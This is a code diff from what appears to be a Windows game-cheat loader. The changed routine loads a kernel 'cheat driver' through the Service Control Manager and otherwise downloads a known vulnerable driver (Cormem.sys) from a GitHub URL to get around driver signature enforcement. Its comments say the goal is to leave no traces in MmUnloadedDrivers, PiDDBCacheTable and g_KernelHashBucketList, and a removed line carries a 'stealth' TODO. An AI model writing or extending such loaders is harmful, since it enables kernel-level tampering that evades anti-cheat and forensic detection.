@@ -233,21 +233,36 @@ __declspec(noinline) auto initComms_() -> bool {
     std::string ExploitSys = GenerateRandomFileName(".sys");
     std::string DriverModule = GenerateRandomFileName(".sys");
 
-    // Download CorMem vuln driver + cheat driver
-    printf(_("[*] Downloading components...\n"));
-    HRESULT hr1 = URLDownloadToFileA(NULL, "https://raw.githubusercontent.com/mrh0ql/vuln/main/Cormem.sys", ExploitSys.c_str(), 0, NULL);
-    // Load the LOCAL fresh build (fixed-GUID handshake) instead of the stale catbox blob.
-    // TODO(stealth): restore remote download for production; local path for testing.
     std::string LocalDriver = "hujdrv.sys";
-    if (!GetFileAttributesA(LocalDriver.c_str()) != INVALID_FILE_ATTRIBUTES) {
+    if (GetFileAttributesA(LocalDriver.c_str()) == INVALID_FILE_ATTRIBUTES) {
         LocalDriver = "C:\\Users\\mason\\Downloads\\fanny\\yanny\\usermode\\x64\\Release\\hujdrv\\hujdrv.sys";
     }
     if (!CopyFileA(LocalDriver.c_str(), DriverModule.c_str(), FALSE)) {
         printf(_("[!] Local driver copy failed (%lu).\n"), GetLastError());
-        DeleteFileA(ExploitSys.c_str());
         DeleteFileA(DriverModule.c_str());
         return false;
     }
+
+    char full_driver[MAX_PATH] = {};
+    GetFullPathNameA(DriverModule.c_str(), MAX_PATH, full_driver, nullptr);
+    std::string direct_svc = GenerateRandomString(10);
+
+    // First try direct SCM load of the signed driver so Cormem.sys is never
+    // downloaded, loaded, or recorded in MmUnloadedDrivers / PiDDBCacheTable / g_KernelHashBucketList.
+    if (load_driver_scm(direct_svc.c_str(), full_driver)) {
+        Sleep(300);
+        DeleteFileA(DriverModule.c_str());
+        if (is_driver_loaded()) {
+            printf(_("[+] Signed driver loaded directly via SCM (zero Cormem traces).\n"));
+            return true;
+        }
+    } else {
+        unload_driver_scm(direct_svc.c_str());
+    }
+
+    // Fallback: download CorMem only if direct SCM load was rejected by DSE
+    printf(_("[*] Downloading components...\n"));
+    HRESULT hr1 = URLDownloadToFileA(NULL, "https://raw.githubusercontent.com/mrh0ql/vuln/main/Cormem.sys", ExploitSys.c_str(), 0, NULL);
     HRESULT hr2 = S_OK;
 
     if (FAILED(hr1) || FAILED(hr2)) {
